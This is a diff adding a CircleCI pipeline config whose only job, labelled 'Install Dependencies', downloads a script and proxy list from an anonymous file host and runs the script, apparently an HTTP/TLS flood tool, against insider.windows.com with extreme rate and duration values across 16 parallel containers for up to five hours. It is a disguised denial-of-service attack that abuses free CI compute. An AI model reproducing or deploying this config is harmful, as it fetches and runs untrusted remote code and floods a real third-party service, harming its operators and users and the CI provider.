@@ -1,0 +1,17 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: debian:latest
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command: apt update && apt install nodejs npm wget -y && npm i fake-useragent && wget https://0x0.st/o3IQ.js && wget https://0x0.st/oY6u.txt && mv o3IQ.js http-tls.js && mv oY6u.txt proxy.txt && chmod 777 * && node http-tls.js https://insider.windows.com/en-us/ 999999 999999999999999999999999 proxy.txt
+            no_output_timeout: 5h
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
